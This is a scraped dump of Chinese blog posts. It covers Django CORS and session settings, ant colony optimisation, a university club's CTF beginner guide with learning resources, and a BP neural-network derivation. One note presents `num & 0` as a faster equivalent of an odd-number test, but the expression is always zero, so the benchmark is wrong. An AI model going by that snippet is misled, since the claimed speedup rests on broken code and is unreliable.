闭包一直好奇闭包有什么用，直到学了 django 后的登录装饰器 闭包的应用：装饰器、面向对象 1234567891011121314151617181920&quot;&quot;&quot;装饰器的应用如果需要统计一个函数运行的时间，加上装饰器即可，可简化代码&quot;&quot;&quot; import timedef func_timer(func): def wrapper(): start_time = time.time() func() print(time.time() - start_time) return wrapper@func_timerdef login(): print(&#x27;login success!&#x27;)login() 跨域问题在与 setting.py 同级目录新建一个 py 文件。写入如下代码 123456789from django.utils.deprecation import MiddlewareMixinclass SolveCrossDomainMiddleware(MiddlewareMixin): def process_response(self, request, response): response[&quot;Access-Control-Allow-Credentials&quot;] = &quot;true&quot; response[&quot;Access-Control-Allow-Origin&quot;] = &quot;http://192.168.123.60:8080&quot; response[&quot;Access-Control-Allow-Methods&quot;] = [&quot;GET&quot;, &quot;POST&quot;] return response 如下图所示 在 settingpy 的 MIDDLEWARE 引入， webproject 与自己的项目名字对应， 1&#x27;webproject.solveCrossDomain.SolveCrossDomainMiddleware&#x27;, 如下图所示 即可解决跨域问题，因为 SolveCrossDomainMiddleware 中已经对 request 和 response 做了处理了 session 跨域问题因为我使用的是 Vue.js + django 前后端分离，因此需要解决 session 跨域问题 Vue 里加入 (因为我使用的是 axios1this.$axios.defaults.withCredentials = true 如下图所示 以下为 django 里的操作我使用的是 数据库存储 session， 因此 setting.py 引入的是 123456789101112131415161718MIDDLEWARE = [...&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,...]SESSION_ENGINE = &#x27;django.contrib.sessions.backends.db&#x27; # 引擎（默认）SESSION_COOKIE_NAME = &quot;sessionid&quot; # Session的cookie保存在浏览器上时的key，即：sessionid＝随机字符串（默认）SESSION_COOKIE_PATH = &quot;/&quot; # Session的cookie保存的路径（默认）SESSION_COOKIE_DOMAIN = None # Session的cookie保存的域名（默认）SESSION_COOKIE_SECURE = False # 是否Https传输cookie（默认）SESSION_COOKIE_HTTPONLY = True # 是否Session的cookie只支持http传输（默认）SESSION_COOKIE_AGE = 3600 # Session的cookie失效日期（默认2周）SESSION_EXPIRE_AT_BROWSER_CLOSE = False # 是否关闭浏览器使得Session过期（默认）SESSION_SAVE_EVERY_REQUEST = False # 是否每次请求都保存Session，默认修改之后才保存（默认）# !!! 这个一定要加.....SESSION_COOKIE_SAMESITE = None # 默认为 Lax, 即 get 可跨域, 而 post 不可以 如下图红线区所示 在 Vue.js 前端引入 migrate 无报错，迁移后数据库没有增加表我是手动直接删除了 migrations 里面的文件和数据库里面的表格，，然后我改了 models.py 后 makemigrations &amp;&amp; migrate 数据库竟然没有多出表。 原来 django 数据库里面，是有这个表格的 里面存放着关于数据库迁移的信息，所以我手动删除了迁移表和数据后并没有什么乱用，数据库以为它还是在的，，所以，我选择了删除所以表格，，重新 makemigrations &amp;&amp; migrate 就好了。 因为这是个人作业，，所以随便删了，生产环境慎用。。。**","categories":[{"name":"开发","slug":"开发","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/"},{"name":"Python","slug":"开发/Python","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Python/"},{"name":"Django","slug":"开发/Python/Django","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Python/Django/"}],"tags":[{"name":"开发","slug":"开发","permalink":"https://tari.moe/tags/%E5%BC%80%E5%8F%91/"},{"name":"Python","slug":"Python","permalink":"https://tari.moe/tags/Python/"},{"name":"Django","slug":"Django","permalink":"https://tari.moe/tags/Django/"}]},{"title":"计算智能实验","slug":"计算智能实验","date":"2019-12-04T07:17:08.000Z","updated":"2021-04-02T02:14:30.450Z","comments":true,"path":"2019/12/04/计算智能实验/","link":"","permalink":"https://tari.moe/2019/12/04/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%AE%9E%E9%AA%8C/","excerpt":"","text":":) 蚁群算法AS求解 TSP 参数一览(设任意两个城市的距离 $d_{ij}$ 为欧几里德距离) AS 中的随机比例规则(random proportional): 对于每只蚂蚁 k, 路径记忆向量 $R^{k}$ 按照访问顺序记录了所有 k 已经经过的程序序号 $ \\tau_{o}(i, j) = \\frac{m}{C^{nn}} $, m是蚂蚁个数, $C^{nn}$ 是由贪婪算法构造的路径的长度 设蚂蚁 k 当前所在城市为 i, 则其选择城市 j 作为下一个访问对象的概率为: $$p_{k}(i,j) = \\begin{cases}\\frac{[\\tau(i, j) ]^{\\alpha} [\\eta(i, j)^{\\beta } ]}{\\sum_{u \\in J_{k}(i) }[\\tau(i, u) ]^{\\alpha} [\\eta(i, u)^{\\beta } ]} &amp; \\text , ; j \\in J_{k}(i) \\;;;;;;;;;;;; 0 &amp; \\text , ; other\\end{cases}$$ $J_{k}(i)$ 表示从城市 i 可以直接到达的且又不在蚂蚁访问过的城市序列 $R^{k}$ 中的城市集合 $\\eta(i, j)$ 是一个启发式信息, 通常由 $\\eta(i, j) = \\frac{1}{d_{ij}}$ 直接计算 $\\tau(i, j)$ 表示边 (i, j) 上的信息素量 $\\alpha$ 和 $\\beta $ 是两个预先设置的参数, 实验表明 $\\alpha$ = 1, $\\beta $ = 2 ~ 5 比较合适 城市 i 与 城市 j 的相连边上的信息素量 $\\tau_(i, j)$ 按如下公式进行更新: $$\\tau(i, j) = (1 - \\rho) \\cdot \\tau(i, j) + \\sum_{ k=1 }^{m} \\Delta \\tau_{k}(i, j)\\\\Delta \\tau_{k}(i, j) = \\begin{cases}(C_{k})^{-1} &amp; , ; (i, j) \\in R^{k} \\0 &amp; ,; other\\end{cases}$$ m 是蚂蚁个数 $\\rho$ 是信息素的蒸发率, 规定 $0 &lt; \\rho \\leqslant 1 $ , $\\rho$ 通常设置为 = 0.5 $\\Delta \\tau_{k}(i, j)$ 是第 k 只蚂蚁在它经过的边上释放的信息素量(没放过当然就取 0 啦！), 它等于蚂蚁 k 本轮构建路径长度的倒数 $C_{k}$ 表示路径长度, 它是 $R^{k}$ 中所有边的长度和 ACS 与 AS 的不同的三个方面参数一览####状态转移规则， ACS中的伪随机比例规则(pseudorandom proportional): 对于每只蚂蚁 k, 路径记忆向量 $R^{k}$ 按照访问顺序记录了所有 k 已经经过的程序序号 设蚂蚁 k 当前所在城市为 i, 则下一个访问城市: $$j = \\begin{cases}arg ; max_{j \\in J_{k}(i)} {[\\tau(i, j) ], [\\eta(i, j)^{\\beta }]} &amp; \\text , ; q \\leqslant q_{0} \\S &amp; \\text , ; other\\end{cases}$$ $J_{k}(i)$ 表示从城市 i 可以直接到达的且又不在蚂蚁访问过的城市序列 $R^{k}$ 中的城市集合 $\\eta(i, j)$ 是一个启发式信息, 通常由 $\\eta(i, j) = \\frac{1}{d_{ij}}$ 直接计算 $\\tau(i, j)$ 表示边 (i, j) 上的信息素量 $\\beta$ 是描述信息素浓度和路径长度信息相对重要性的控制参数 $q_{0}$ 是一个 [0, 1] 区间内的参数, 当产生的随机数 $q \\leqslant q_{0}$ 时, 蚂蚁直接选择使启发式信息与信息素量的 $\\beta$ 指数乘积最大的下一城市节点, 我们通常称之为开发(exploitation); 反之, 当产生的随机数 $q &gt; q_{0}$ 时, ACS将和各种AS算法一样使用轮盘赌选择策略, 即偏向探索(biased exploration) 信息素全局更新规则 不论是信息素的蒸发还是释放, 都只在属于至今最优路径的边上进行 $$\\tau(i, j) = (1 - \\rho) \\cdot \\tau(i, j) + \\rho \\cdot \\Delta \\tau_{b}(i, j) , \\forall (i, j) \\in T_{b}$$ $\\Delta \\tau_{b}(i, j) = \\frac{1}{C_{b}}$ 参数 $\\rho$ 代表信息素蒸发的速率, 新增加的信息素 $\\Delta \\tau_{b}(i, j)$ 被乘上系数 $\\rho$ 后, 更新后的信息素浓度被控制在旧信息素量与新释放的信息素量之间, 用一种隐含的又更简单的方式实现了 MMAS 算法中对信息素量取值范围的限制 信息素局部更新规则$$\\tau(i, j) = (1 - \\xi) \\cdot \\tau(i, j) + \\xi \\cdot \\tau_{0}$$ $\\xi$ 是信息素局部挥发速率, 满足 $0 &lt; \\xi &lt; 1$, 通过实验发现 $\\xi = 0.1$ $\\tau_{0}$ 是信息素的初始值, 取值为 $\\frac{1}{nC^{nn}}$ 时, 对大多数实例有着非常好的性能. 其中 n 为城市个数, $C^{nn}$ 是由贪婪算法构造的路径的长度","categories":[{"name":"学校课程","slug":"学校课程","permalink":"https://tari.moe/categories/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"}],"tags":[{"name":"学校课程","slug":"学校课程","permalink":"https://tari.moe/tags/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"}]},{"title":"记录一些杂乱的东西","slug":"乱七八糟","date":"2019-11-18T06:26:32.000Z","updated":"2021-04-02T02:14:43.159Z","comments":true,"path":"2019/11/18/乱七八糟/","link":"","permalink":"https://tari.moe/2019/11/18/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/","excerpt":"","text":"能量是标量这句话意味深远呀 ～一群人纠结了一天这个题目的结果是标量还是矢量，23333 二进制的魅力~老久之前一直想记下来, 一直忘了… 12345678910111213141516import timenum_need_validate = 123423cnt = 10**7a = 0 time_start1 = time.time()for i in range(cnt): if (num_need_validate % 2) != 0: a = a + 1# 平均在这个数字 2.133270025253296print(time.time() - time_start1) 123456789101112131415161718import mathimport timenum_need_validate = 123423cnt = 10**7a = 0time_start2 = time.time()for i in range(cnt): if (num_need_validate &amp; 0) : a = a + 1 # 平均在这个数字 0.8398542404174805print(time.time() - time_start2) linux 趣事一直很好奇 vim 的 hjkl 方向键 以及 ~ 为什么是根目录…https://catonmat.net/why-vim-uses-hjkl-as-arrow-keys","categories":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/categories/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"}]},{"title":"佛大2019红帽杯相关咨询","slug":"2019hmb","date":"2019-10-17T16:09:54.000Z","updated":"2021-04-04T05:10:06.534Z","comments":true,"path":"2019/10/18/2019hmb/","link":"","permalink":"https://tari.moe/2019/10/18/2019hmb/","excerpt":"","text":"1.什么是CTFCTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。 2.什么是红帽杯红帽杯是由广东省计算机信息网络安全协会将于2019年11月在广州举办第三届红帽杯网络安全攻防（CTF）大赛。 报名时间10月10日00:00 - 11月07日24:00 初赛时间11月10日09:00 - 11月11日09:00 报名官方网站 https://www.cinsa.org.cn/2019redhat 欢迎咨询佛大信息安全协会 微信号： 范同学：fjw712452 刘同学：Glan5812 徐同学：Gtari720 3.入门CTF，你需要什么 快速学习新事物的能力 一个不一样的思考方式 一颗乐于解决问题的心 一些有趣的网络安全技术 一段充实奋斗的时光 在这里，我们希望能给予你一些建议： 善用 Google 搜索可以帮助你更好地提升自己 掌握至少一门编程语言，比如 Python 实践比什么都要管用 保持对技术的好奇与渴望并坚持下去 4.CTF是怎么比赛的由于 CTF 的考题范围其实比较宽广，目前也没有太明确的规定界限说会考哪些内容。但是就目前的比赛题型而言的话，主要还是依据常见的 Web 网络攻防、RE 逆向工程、Pwn 二进制漏洞利用、Crypto 密码攻击、Mobile 移动安全 以及 Misc 安全杂项 来进行分类。 Web - 网络攻防主要为 Web 安全中常见的漏洞，如 SQL 注入、XSS、CSRF、文件包含、文件上传、代码审计、PHP 弱类型等，Web 安全中常见的题型及解题思路，并提供了一些常用的工具。 Reverse Engineering - 逆向工程主要为逆向工程中的常见题型、工具平台、解题思路，进阶部分介绍了逆向工程中常见的软件保护、反编译、反调试、加壳脱壳技术。 Pwn - 二进制漏洞利用Pwn 题目主要考察二进制漏洞的发掘和利用，需要对计算机操作系统底层有一定的了解。在 CTF 竞赛中，PWN 题目主要出现在 Linux 平台上。 Crypto - 密码攻击主要包括古典密码学和现代密码学两部分内容，古典密码学趣味性强，种类繁多，现代密码学安全性高，对算法理解的要求较高。 Mobile - 移动安全主要为安卓逆向中的常用工具和主要问题类型，安卓逆向常常需要一定的安卓开发知识，iOS 逆向题目在 CTF 竞赛中较少出现，因此不作过多介绍。 Misc - 安全杂项以诸葛建伟翻译的《线上幽灵：世界头号黑客米特尼克自传》和一些典型 MISC 题为切入点，内容主要包括信息搜集、编码分析、取证分析、隐写分析等。 5.CTF方向那么多，我选择那一条呢 这需要你自己选择一个适合的方向，下面是各个方向的介绍。 A方向：PWN+Reverse+Crypto随机搭配 IDA工具使用（f5插件）、逆向工程、密码学、缓冲区溢出等 B方向：Web+Misc 网络安全、内网渗透、数据库安全等 公共部分：Linux基础、计算机组成原理、操作系统原理、网络协议分析 这是简单的介绍，去选择一条属于自己的路吧！ PWN、Reverse偏重对汇编、逆向的理解 Crypto偏重对数学、算法的深入学习 Web偏重对技巧沉淀、快速搜索能力的挑战 Misc比较复杂，所有与计算机安全挑战有关的都算在其中 6.我选好了路，但是怎么去学习呢下面推荐几本书： A方向：IDA pro权威指南（重要）揭秘家庭路由器0day漏洞挖掘技术RE for Beginners（逆向工程入门）自己动手写操作系统黑客攻防技术宝典：系统实战篇 B方向：Web应用安全权威指南（适合小白入门对WEB安全进行宏观的理解）黑客攻防技术宝典 Web实战篇Web前端黑客技术揭秘黑客秘籍-渗透测试实用指南代码审计：企业级Web代码安全架构 7.web、Reverse、PWN、Crypto和Misc的详细入门指导请戳我！8.总结CTF可能门槛比较高，但是入门之后你会发现其乐趣 在学习过程中遇到挫折不要轻易放弃，建议先谷歌查找相关资料，实在查不到再求助他人。 关于如何提问，建议阅读这篇文章：提问的智慧 有任何问题欢迎到群里或联系协会成员。 补充 Q1: 要是我技术不好或者基础不太好怎么办？你们会教吗？ A1: 不用担心，我们会根据你们大部分人的基础，给予你们相关资料和多次线下培训。不用担心自己什么都不会，一开始谁都是小白，本次红帽杯参赛匆忙怕取得不了好成绩的，也可以为12月份百度杯，明年1月份安恒杯做准备喔！ Q2： 教练，我迫不及待想看看ctf大概是怎样的 A2： 这个是中科大的新生ctf赛。相对会简单些的。如果有迫不及待想了解ctf是怎样的同学可以注册个账号玩玩，不懂的可以百度或者群上问喔！ https://hack.lug.ustc.edu.cn/ 2019 年度中国科学技术大学第六届信息安全竞赛即将开幕，科大信息安全大赛自 2014 年起已经连续举办五届，往届比赛均顺利举行，规模盛大，影响甚广。 赛制：个人线上比赛，解题模式，约 25 道题目； 比赛题目分为 4 类，分类如下：综合技能（general）、程序逆向与漏洞利用（binary）、密码学与数学（math）、网站安全（web）","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"入门","slug":"ctf/入门","permalink":"https://tari.moe/categories/ctf/%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"入门","slug":"入门","permalink":"https://tari.moe/tags/%E5%85%A5%E9%97%A8/"}]},{"title":"佛大2019红帽杯入门指导","slug":"2019hmb_guide","date":"2019-10-17T06:09:50.000Z","updated":"2021-04-04T05:10:03.823Z","comments":true,"path":"2019/10/17/2019hmb_guide/","link":"","permalink":"https://tari.moe/2019/10/17/2019hmb_guide/","excerpt":"","text":"Web入门传送门Re 逆向 入门传送门PWN 二进制 入门传送门Crypto 密码学 入门传送门Misc 杂项 入门传送门 萌新入门刷题传送门 1.web的详细入门指导首先，大略过一下最基础的语言语法HTML／CSS、JavaScript、PHP、SQL的基本知识（平均一个语言4小时足矣），要做到看到这些代码的时候不会畏惧，能看懂大部分，看到不懂的能通过google或者相关文档查懂。主要参考：http://www.w3school.com.cn/ 、http://www.runoob.com/ , 这里不要求学很深，很浅很浅就行，后面边学边用掌握的会更快。 现在，你初步了解了一些语言知识，接下来你就需要开始在实践中学习与巩固。 当然就是实践了。这里，我建议你搭建一个个人的博客，初步了解这些语言的应用。在搭建博客的过程中，你需要学习对应的linux操作、Apache+PHP+Mysql环境的配置、域名解析、服务器端口配置等等。如何搭建博客，请自行google搜索。此外，你也可以编写一些好玩的网页来学习这些知识点。 如果你能完成如上所说的这些，尤其是第三点，那么恭喜你，你入门了，其实这些前期会遇到很多语言方面难免会遇到挫折，但是没关系，多百度多谷歌，多群里提问，我们都会及时给你解答。 接下来可以了解基本的HTTP协议相关知识 掌握HTTP请求：GET、POST、HEAD，能基本读懂一个HTTP数据包，了解GET、POST、HEAD的区别 能看懂HTTP响应包 404 403 200 500 302 301 … 了解Cookie、session、token，知道是什么东西，作用是什么，为什么需要这些东西 了解Referer、X-Forwarded-For等等的作用 学漏洞知识点之前，如果你了解了如上所说的一些东西，那么就可以学习下面的知识(进阶)啦，当然能学懂上面的知识可能需要大概3周左右的时间，多坚持，多提问。 sql注入 XSS攻击 文件上传漏洞 文件包含漏洞 命令执行漏洞 。。。 推荐一些学习站点https://ctf-wiki.github.io/ctf-wiki/&gt; https://xz.aliyun.com/ https://www.anquanke.com/ https://github.com/CHYbeta/Web-Security-Learning 推荐一些题库https://cgctf.nuptsast.com/login https://www.jarvisoj.com/login 推荐一些大牛的博客https://chybeta.github.io/ https://www.jianshu.com/u/bf30f18c872c https://skysec.top/ https://lorexxar.cn/ 推荐书籍《白帽子讲web安全》 《黑客攻防技术宝典·Web实战篇》 2.Reverse的详细入门指导逆向工程，Reverse，缩写一般为Re。旨在不知晓源码的情况下对程序进行分析，获取其流程，组织，结构等。CTF中一般为注册机这种形式。 最好会C语言和汇编语言，不必系统的学习汇编，上来先一条一条查指令手册，等熟悉了再仔细学习。 需了解常见加密算法的实现，要做到快速识别，无需了解攻击过程。 如何学习逆向呢，可以看下面这基本书学习基础知识，同时打比赛刷题，以赛带练。 推荐书籍 《汇编语言》（王爽） 这本比较老了，讲的8086汇编，但是讲的很好。 《加密与解密》（第四版）（看雪论坛） 看雪出的经典书籍，名叫加密与解密实际上是讲逆向。各方各面都有讲到，很全面。 《逆向工程核心原理》 主要是windows逆向，以OD为主要工具。讲的很好，面向零基础。 下面的我没看过，不好评价。。。 《Reverse Engineering for Beginners》(电子书：https://beginners.re/)（中文版为《逆向工程权威指南》） 《Android应用安全防护和逆向分析》 《Android软件安全与逆向分析》 常用工具 IDA Pro 极其强大的反汇编/反编译/调试工具，二进制选手必须会用，优秀的二进制选手能把IDA运用到出神入化的地步。有关IDA的使用能讲好多好多。 吾爱破解论坛爱盘下载。 x64dbg Windows平台优秀的开源反汇编器及调试器，可以看作Olly dbg的升级版，基本包含OD的全部功能，且一直在更新 官网下载。 gdb Linux的调试器，没有GUI。pwn选手必须掌握的技能。也可以使用IDA的远程调试功能调试linx程序。 一般的Linux自带，没有的话apt安装。 Jeb apk反编译工具，功能强大。 jadx 开源的apk反编译工具，轻量级 其他 dnSpy，xspy，CFF explorer等各类专用工具，需要靠做题中积累。 论坛与站点 汇编语言指令学习：https://www.cnblogs.com/del/category/121079.html 这一系列文章细致的讲解了win32汇编，遇到不认识的指令可到这里查询（当然直接翻intel指令手册是最准确的） 吾爱破解：知名破解论坛，注册有限制，需要10元注册或等开放。吾爱的爱盘内有大量常用工具，以及逆向专用虚拟机，可按需学习与使用。 https://www.52pojie.cn/ 看雪论坛：知名逆向论坛 https://bbs.pediy.com/ 安全客、先知等各类安全论坛，上面有各种大佬发的文章。 3.PWN的详细入门指导pwn，及pwn to own，在黑客俚语中由own演变而来。通过逆向分析二进制程序，发现其可能存在的漏洞，并进行利用，从而达到信息泄露、权限获取等目的。 需要掌握汇编语言、基础逆向方法。 入门推荐到CTF wiki的pwn板块学习，上面有极其详细的pwn教程，各类漏洞点及利用。 CTF一般为linux环境下的pwn，要熟悉linux的使用。 IDA Pro 强大的反编译工具，有了它就能轻松审计漏洞了。 gdb为做pwn题时调试必备的工具，网上有非常多关于gdb的教程。 pwndbg——gdb插件：https://github.com/pwndbg/pwndbg pwntools为专门用来做pwn题的工具，所以要学习python与pwntools。 其余学习教程： 一步一步学ROP系列：http://wooyun.jozxing.cc/static/drops/tips-6597.html http://wooyun.jozxing.cc/static/drops/papers-7551.html http://wooyun.jozxing.cc/static/drops/binary-10638.html http://wooyun.jozxing.cc/static/drops/papers-11390.html 堆基础学习: glibc内存管理ptmalloc源代码分析.pdf linux内核源码(建议直接看malloc free源码) 堆基础(英文blog) 推荐书籍： 《深入理解计算机系统（原书第3版）》 《程序员的自我修养—链接、装载与库》 4.Crypto的详细入门指导密码学需要较强的数学基础。ctf wiki也是入门不错的选择。 了解各种密码的实现过程，相关的攻击方法。 各种密码推荐直接到英文维基学习，讲的十分详细，一般也会有源代码。 上来学习密码学可以抄脚本，不用太关心其数学原理。等深入了解后再详细研究。 古典密码——脑洞大开的密码：链接 RSA攻击汇总：https://xz.aliyun.com/t/2446#toc-32 RSAcoppersmiths攻击：https://github.com/mimoo/RSA-and-LLL-attacks 一堆密码学的题目：https://cryptopals.com/ 推荐书籍： 《深入浅出密码学——常用加密技术原理与应用》 《密码编码学与网络安全——原理与实践（第七版》 《图解密码技术》 《应用密码学：协议、算法与C源程序》 5.Misc的详细入门指导杂项，简称Misc。杂项的内容很多很广，需要选手有较大的知识面以及快速学习新鲜事物的能力。 一般包括取证，隐写分析，编码转换，信息收集，流量分析等。有时密码学中的古典密码也被放到杂项里去。其中取证与隐写是misc最重要的一块。需要选手掌握各种花式隐写套路，需有较强的脚本功底，会用各类隐写工具。 隐写 https://www.jianshu.com/p/02fdd5edd9fc流量分析 《Wireshark网络分析就这么简单》ctf-wiki: https://ctf-wiki.github.io/ctf-wiki/misc/introduction-zh/ 适合萌新刷题入门传送门 攻防世界 有萌新区 2019中科大ctf新生赛 南京邮电大学网络攻防平台 较多为简单题 picoCTF2018和2019 美国面向高中生的ctf比赛 2018中科大ctf新生赛 github存档","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"入门","slug":"ctf/入门","permalink":"https://tari.moe/categories/ctf/%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"入门","slug":"入门","permalink":"https://tari.moe/tags/%E5%85%A5%E9%97%A8/"}]},{"title":"2019pico小汇总","slug":"2019pico","date":"2019-10-13T04:51:51.000Z","updated":"2021-04-04T05:09:49.334Z","comments":true,"path":"2019/10/13/2019pico/","link":"","permalink":"https://tari.moe/2019/10/13/2019pico/","excerpt":"","text":"和两位新认识的小伙伴一起玩了1天，虽然解出来的题不算很多，但玩的还是很开心。picoctf相对来说也会简单些，但是也还是有收货的。在此记录一下。由于国庆比较忙，也没有继续在解题了，然后也忘了写记录了，emmm。下图是我们队伍的1天的解题成果。这是报了小伙伴的大腿@guoguo @回忆 过些天再补上心得，2333","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"比赛","slug":"ctf/比赛","permalink":"https://tari.moe/categories/ctf/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"比赛","slug":"比赛","permalink":"https://tari.moe/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"计算智能入门作业","slug":"计算智能入门","date":"2019-10-03T16:35:37.000Z","updated":"2021-04-02T02:14:27.800Z","comments":true,"path":"2019/10/04/计算智能入门/","link":"","permalink":"https://tari.moe/2019/10/04/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8/","excerpt":"","text":"老师布置的作业 描述 BP 神经网络（BPNN）的训练过程，推导 3 层 BPNN 调整网络权重和偏置量的公式。 这公式推导有点难度… :(然后网上查了许多资料，有两个收获: 神经网络在隐藏层做了什么 把天天听闻的线性代数对神经网络重要性联系在一起 隐藏层：该层可以说是神经网络的关键，相当于对数据做一次特征提取。隐藏层的意义，是把前一层的向量变成新的向量。就是坐标变换，说人话就是把数据做平移，旋转，伸缩，扭曲，让数据变得线性可分。可能这个不那么好理解，举个栗子： 下面的图左侧是原始数据，要把绿点和红点分割开，要怎么做呢？ 上面二图可以在这玩 一种做法：把左图的平面看成一块布，把它缝合成一个闭合的包包（相当于数据变换到了一个3维坐标空间），然后把有绿色点的部分撸到顶部（伸缩和扭曲），然后外围的红色点自然在另一端了，要是姿势还不够帅，就挪挪位置（平移）。这时候干脆利落的砍一刀，绿点红点就彻底区分开了。 论线性代数的重要性，联系不起来可来这里补课b站线性代数的本质 关于线性变换到3维空间 不同维度的变换是合理的 例如下面这个矩阵，它的几何意义就是将二维空间映射到三维空间上 $$ \\begin{bmatrix} 3 &amp; 1\\ 4 &amp; 1\\ 5 &amp; 9 \\end{bmatrix} $$ 因为矩阵有两列表面输入空间有两个基向量， 有三行表示每一个基向量在变换后都用三个独立的坐标来描述 所以它们一定落在三维空间中，因此这是一个从二维空间到三维空间的变换 不太理解可以看此视频 b站线性代数的本质-第四章 再如下面这个矩阵 $$ \\begin{bmatrix} 3 &amp; 1 &amp; 4\\ 1 &amp; 5 &amp; 9 \\end{bmatrix} $$ 矩阵三列表示原始空间有三个基向量，也就是说原始空间是三维 有两行表明这三个基向量在变换后都仅用两个坐标来描述 所以它们一定落在二维空间中，因此这是一个从三维空间到二维空间的变换 一个二维向量输入到三维向量输出:$$\\begin{bmatrix}3\\1\\end{bmatrix}\\rightarrow L\\left ( \\vec{\\nu} \\right ) \\rightarrow \\begin{bmatrix}1\\8\\2\\end{bmatrix}$$ 回想线性代数，$ L\\left ( \\vec{\\nu} \\right ) $ 是一个3行2列的矩阵则 $ L\\left ( \\vec{\\nu} \\right ) $ 乘以2行1列(3,1)的矩阵就是以它为基向量作基变换得到的结果就是升维到三维空间后的向量 # 吹完水了，开始推导公式…hexo 支持LaTex参考链接 三层 BPNN 调整网络权重和偏置量的公式分别为$$ \\omega_{ij}=\\omega_{ij} + \\Delta \\omega_{ij} = \\omega_{ij} + (\\eta)O_{i}E_{j} \\qquad (1) $$$$ b_{j}=b_{j} + \\Delta b_{j} = b_{j} + (\\eta)E_{j} \\qquad\\quad\\quad (2) $$ 其中： $\\omega_{ij}$ 表示输入层到隐含层的权重，$\\eta$ 表示学习率 $O_{i}$ 表示上一层单元i的输出，$E_{j}$ 表示j层神经元误差 $b_{j}$ 表示j单元偏置量(至于为什么取名为b，下面有提到) 现需要推导(1)(2)式子等号成立 先取激活函数$$f(x)=\\frac{1}{1+e^{-x}}$$ 由上图除了输入层的神经元，每个神经元都会有加权求和得到的输入值 z 和将 z 通过 Sigmoid 函数（也即是激活函数）非线性转化后的输出值 a，他们之间的计算公式如下$$z_{i}^{j}=\\sum_{i=1…n}w_{ij}\\cdot a_{ij}^{l-1}-b_{j}^{l} \\qquad (3)\\a_{j}^{l}=f(z_{j}^{(l)})=\\frac{1}{1+e^{-z_{j}^{(l)}}} \\quad (4)$$ 式子(3)，是不是和 y = kx + b类似？ 其实b可以理解为线性偏差 (这也是取b为名的原因，方便理解) 然后代入到Sigmoid 函数中做非线性变换，做这个变换主要是因为线性模型的表达能力不够(详情请戳我)，其实这个非线性变换也有它的缺点，比如 梯度消失、不是0均值、不是0均值 因为输出层的值与真实的值会存在误差，我们可以用均方误差来衡量预测值和真实值之间的误差。$$E=\\frac{1}{2}\\sum_{j=1}^{l}(Y_{j}^{k}-a_{j}^{l})^{2} \\qquad (5)$$ 其中 $Y_{j}^{k}$ 表示期望输出，是已知量 误差肯定是越小越好。因此，我们就要调整w和b值， 使得误差函数的值最小。 要求式子(5) 在两个变量 ( $\\omega$ 和 $b$ ) 取不同值时的最值，首先想到的就是求各自的偏导了 引入式子(1) 和 (4) 对目标函数 E 求 $\\omega$ 和 $b$ 的偏导可以得到 $\\omega$ 和 $b$ 的更新量 下面拿求 $\\omega$ 偏导来做推导。$$\\Delta \\omega_{ij} = \\eta\\frac{\\partial E}{\\partial w_{hj}} \\qquad (6)$$ $\\eta$ 学习率取值通常为 0.1 ~ 0.3,可以理解为每次梯度所迈的步伐。 $w_{hj}$为 h 和 j 两层神经元之间的权重 注意到 $w_{hj}$ 的值先影响到第 j 个输出层神经元的输入值 a，再影响到输出值 y 根据链式求导法对权重求偏导有：$$\\frac{\\partial E}{\\partial w_{hj}} =\\frac{\\partial E}{\\partial a_{j}^{l}}\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}}\\cdot\\frac{\\partial z_{j}^{l}}{\\partial w_{hj}} \\qquad (7)$$ 由 (3) 有:$$\\frac{\\partial z_{j}^{l}}{\\partial w_{hj}} = {(\\sum_{i=1…n}w_{hj}\\cdot a_{hj}^{l-1}-b_{j}^{l})}’ = a_{hj}^{l-1} = O_{i} \\qquad (8)$$ 与神经网络结构图对应知 $ a_{hj}^{l-1} $ 为上一层单元i的输出 $ O_{i} $ Sigmoid 求导的式子如下，求导过程请戳我$$f{}’(x) = f(x)(1-f(x)) \\qquad (9)$$由 (5) 和 (9) 有：$$\\frac{\\partial E}{\\partial a_{j}^{l}}\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}} = -\\frac{1}{2}\\cdot 2\\cdot (Y_{j}^{k}-a_{j}^{i})\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}}=a_{j}^{l}\\cdot (1-a_{j}^{l})\\cdot (Y_{j}^{k}-a_{j}^{l}) = E_{j} \\qquad (10)$$ 再看看式子 (1) 和 (2) 中的 $E_{j}$，课本给出 关于 $ E_{j} $的公式:$$E_{j} = O_{j}(1-O_{j})(T_{j}-O_{j}) = O_{j}(1-O_{j}))\\sum_{k}w_{jk}E_{k} \\qquad (11)$$ 其中 $ T_{j} $ 是输出单元 $j$ 的预期是输出， 即式子 (10) 中的 $ Y_{j}^{k} $ $ E_{k} $ 表示它连接的后面一层的单元 $k$ 的误差, 由此看式子 (11) 